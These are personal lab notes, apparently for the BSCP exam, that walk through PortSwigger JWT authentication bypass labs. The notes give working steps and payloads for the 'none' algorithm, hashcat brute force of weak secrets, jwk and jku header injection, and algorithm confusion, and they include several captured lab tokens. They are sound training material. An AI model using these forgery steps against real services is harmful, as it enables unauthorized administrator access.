# JWT

 Symmetric Key  : HS256
 ASymmetric key : RSA

### Lab: JWT authentication bypass via unverified signature

Payload
```
change path :  /admin

{"iss":"portswigger","exp":1760963935,"sub":"wiener"}

{"iss":"portswigger","exp":1760963935,"sub":"administrator"}



```

### Lab: JWT authentication bypass via flawed signature verification

Payload
```
{"kid":"d6458e13-1d6f-4510-95ed-2a634838ee97","alg":"RS256"} 
{"kid":"d6458e13-1d6f-4510-95ed-2a634838ee97","alg":"none"}
- Remove the signature from the JWT, but remember to leave the trailing dot after the payload.

{"iss":"portswigger","exp":1760966827,"sub":"wiener"}
{"iss":"portswigger","exp":1760966827,"sub":"administrator"}

```

### Lab: JWT authentication bypass via weak signing key

Payload
```
step 1 : Brute-force the secret key

	hashcat -a 0 -m 16500 complete_jwt_tokens ./jwt.secrets.list  : secret1
	Encode in base64 secret1 : c2VjcmV0MQ==

step 2: Generate a forged signing key

	 - JWT Editor Keys tab and click New Symmetric Key : Generate
	 - Replace the generated value for the k property with the Base64-encoded secret.

step 3 - Modify and sign the JWT
		
	 - {"iss":"portswigger","exp":1760963935,"sub":"wiener"}
	 - {"iss":"portswigger","exp":1760963935,"sub":"administrator"}

	 - Sign, then select the key that you generated .



```

## JWT header parameter injections

- According to the JWS specification, only the alg header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

		- 	jwk (JSON Web Key) - Provides an embedded JSON object representing the key.
		-	jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
		-	kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.

### Lab: JWT authentication bypass via jwk header injection

Payload
```
- JWT Editor Keys tab.
- Generate a new RSA key .
- JSON Web Token tab and modify the token's payload however you like.
- Click Attack, then select Embedded JWK.
- you may also need to update the JWT's kid header parameter to match the kid of the embedded key

```

### Lab: JWT authentication bypass via jku header injection

Payload
```
step 1: Generate a RSA signing key
	- JWT Editor Keys tab.
	- Generate a new RSA key 
	- Paste the RSA key on exploit server in below section :
		{
    	"keys": [
    		// Generate a new RSA key 
    		]
		}

- step 2 - Modify and sign the JWT
	- Match the both kid values (new values)
	- Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.
	- sub  : administrartor 
	- Sign with RSA key
```

![alt text](https://raw.githubusercontent.com/robin113x/BSCP-Exam/refs/heads/main/Images/jwt-jku.jpg)


<hr>

### Lab: JWT authentication bypass via algorithm confusion


Payload
```
step 1 — Obtain the server public key
	- Open /jwks.json in the browser and copy the single JWK object from the keys array (copy only the object).

step 2 — Create a malicious symmetric key in Burp

	- In Burp → JWT Editor → Keys: New RSA Key → choose JWK and paste the copied JWK; save.
	- Right-click the new key → Copy Public Key as PEM.
	- Base64-encode that PEM (use Decoder tab) and copy the Base64 string.
	- In JWT Editor → Keys: New Symmetric Key → Generate, then replace the k value with the Base64-encoded PEM; save.

Step 3 — Modify and sign the token

	- Open the GET /admin request in Repeater, switch to the JWT Editor tab.
	- Change JWT header alg → HS256.
	- Change payload claim sub → administrator.
	- Click Sign, pick the symmetric key you created, ensure Don't modify header is selected, and sign.
	- Send the request — you should now access the admin panel.

```


eyJraWQiOiJkMDViODA0OS0zMTJhLTQ5ZDEtOWEzMS1mYzZhZGYyMzA5MDMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTA4ODA4OSwic3ViIjoid2llbmVyIn0.lS8m_gxpM4IOtEdpN4qRmi9y78y27xfWUCQd9Rhe7mn4MVpvjvPC0zwgD54Y1zOYUohmAHScqQHpqskJ7xm1BviNseldHnuyskG1cdi1DRd_-nglQAGfyor7Zq37wS05TzWIBCvlNgoA3fl53bQMbAAtoNACRgEkRCxwbT3_TAu0rxohctZKXF92sTQxqwsu0EbCgU-UzpAJid9Q9hZBGDy9v0MhFoe-T67RCjZEgrOkFSp6tuu0-KneQa2Rd39T4WMMKAJpzneUDX6U-IISChZaK06ORCNnWQIHmSfXas6Burt8HzqHOxbXb5KrnGQBOJ7Em6fRUrpXMxR1j_h9nQ


eyJraWQiOiJkMDViODA0OS0zMTJhLTQ5ZDEtOWEzMS1mYzZhZGYyMzA5MDMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTA4ODE3OSwic3ViIjoid2llbmVyIn0.LwNBoOjD0-VwaVQeZ9ELLWDQPUzqR5Uk-vbdMtbM3DVwWWl2xohuE_Qqhi6vQ4p7YdQuYIhrrRSU-nHhZS90nPInvLFLFqYbxrB83Pl9TWxForedKF8eHAKlZ6V7YlmQpknU0divlLb05daF6JeslBbDlXicSy41Gl4KOZncssUwMY-meARFLd9c2vNYwL08KpwJcguSXCXYd7mtrFp2mJj6aLrQbSpMTjtC8iVdzOW4SYnnFpr22gSQoRV8uL1XS66yJNr-WzbFuG88-YnlduywfKuBRbdIpQHhVq6UQbDefC73oWjwkTUMjMIg1AhD1wIhe4labSni8sm5W4Rr6w


Payload
```
Step1:  Collect two valid JWTs
	- Log in, capture the session JWT (/my-account → store cookie).
	- Log out, log in again, capture a second JWT.
Step2: Brute-force candidate public keys
	- Run docker run --rm -it portswigger/sig2n <token1> <token2>.
	- The tool outputs candidate n values, Base64 X.509/PKCS1 public keys and tampered JWTs.
Step3: Find the server’s actual public key
	- For each tampered JWT (X.509 entry) replace your session cookie in Burp and request /my-account.
	- A 200 means you found the correct X.509 key; a 302 redirect to /login means it’s wrong.
Step4: Create a symmetric key in Burp
	- In JWT Editor → Keys → New Symmetric Key → Generate JWK.
	- Replace the k value with the Base64 X.509 key you identified (use the key itself, not the tampered JWT). Save.
	- Forge and sign an admin token
	- In Repeater open the JWT (JWT Editor tab). Set header alg: HS256.
	- Change payload claim sub to administrator.
	- Sign with the symmetric key you created (ensure “Don't modify header” is selected). This uses the server’s public key as the HMAC secret.
```